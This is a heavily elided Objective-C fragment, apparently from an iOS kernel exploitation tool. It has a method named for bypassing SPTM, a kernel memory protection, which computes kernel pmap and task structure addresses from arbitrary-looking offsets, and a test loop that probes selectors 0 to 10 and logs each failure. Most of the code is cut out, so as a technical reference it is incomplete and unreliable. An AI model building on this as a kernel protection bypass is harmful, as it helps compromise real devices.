...
+ (void)runSPTMBypassWithLogger:(DebugLogger *)logger {
    ...
    const uint64_t KERNEL_PMAP_ADDR = kernel_base + 0x1000000;
    const uint64_t TASK_STRUCT_ADDR = kernel_base + 0x2000000;
...
+ (void)runTest {
    ...
    for (int selector = 0; selector <= 10; selector++) {
        ...
        [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Selector %d failed: %s", selector, mach_error_string(kr)]];
    }
